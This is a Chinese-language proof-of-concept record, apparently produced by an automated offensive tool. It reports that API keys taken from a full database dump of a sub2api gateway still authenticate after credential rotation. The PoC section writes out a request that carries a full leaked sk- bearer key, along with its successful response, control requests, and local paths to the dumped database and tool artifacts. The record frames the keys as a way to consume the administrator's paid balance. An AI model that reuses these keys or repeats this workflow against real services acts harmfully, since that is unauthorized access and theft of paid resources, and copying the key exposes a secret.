# sub2api 网关 API Key 未随凭据轮换失效（dump 泄露的 sk- key 仍可调用 /v1 付费接口） @ target483.example.com

- **code**: sub2api-网关-api-key-未随凭据轮换失效-dump-泄露的-sk-key-仍可调用-v1-付费接口
- **kind**: poc
- **category**: info-leak
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: ARTEX 已确认（finding#1203 / 任务#607）：target483.example.com 的 sub2api 网关 API key 在管理员改密/凭据轮换后未被轮换：全库 dump（2026-10-31 01:02 导出）中 api_keys 表 167 枚真实 sk- 键，其中 uid=1（user@example.com，余额 99902.7）名下 7 枚属于仍存活分组 gro…
- **path**: pocs/sub2api-网关-api-key-未随凭据轮换失效-dump-泄露的-sk-key-仍可调用-v1-付费接口/poc.md
- **tags**: high,credential-leak
- **created_at**: 2026-10-31T02:33:33.710Z
- **engine**: target483.example.com
- **found_by**: work#1

## 描述

target483.example.com 的 sub2api 网关 API key 在管理员改密/凭据轮换后未被轮换：全库 dump（2026-10-31 01:02 导出）中 api_keys 表 167 枚真实 sk- 键，其中 uid=1（user@example.com，余额 99902.7）名下 7 枚属于仍存活分组 group 5 的 key 仍可直接调用 /v1 付费接口——GET /v1/models 返回 200 与完整模型清单（含 gpt-6/gpt-image-2 等），而无效 key 返回 401 INVALID_API_KEY、无 key 返回 401 API_KEY_REQUIRED，可凭泄露 key 无偿消耗管理员余额调用上游模型。

## 正文

```
GET https://target483.example.com/v1/models -H "Authorization: Bearer sk-257c09a4d84250ed98ef354a9d6bb902f3229b696c191155c083ac0c7e4aa897" -A "<Chrome UA>" → HTTP 200, 3755B, {"data":[{"id":"gpt-6"...},{"id":"gpt-image-2"...}]}
对照：无 Authorization → 401 {"code":"API_KEY_REQUIRED"}（143B）；Bearer sk-000…0 → 401 {"code":"INVALID_API_KEY"}（54B）；Bearer sk-452481c3…（key id230，所属 group 4 已被删）→ 403 {"code":"GROUP_DELETED"}（66B，证明该 key 在库中仍被识别）。
来源：D:\ARTEX\data\tasks\607\i6403\db.sql（api_keys 259 行，167 行真实键；groups 表仅 grp5 'ce' 与 grp18 '自部署DEEPSEEK' 未删除）。
产物：D:\ARTEX\data\tasks\607\i6502\dumptables.json、an5.py、t1.txt。
证伪条件：若该 key 返回 401/403 或模型清单为空则不成立——本次均未出现。
```
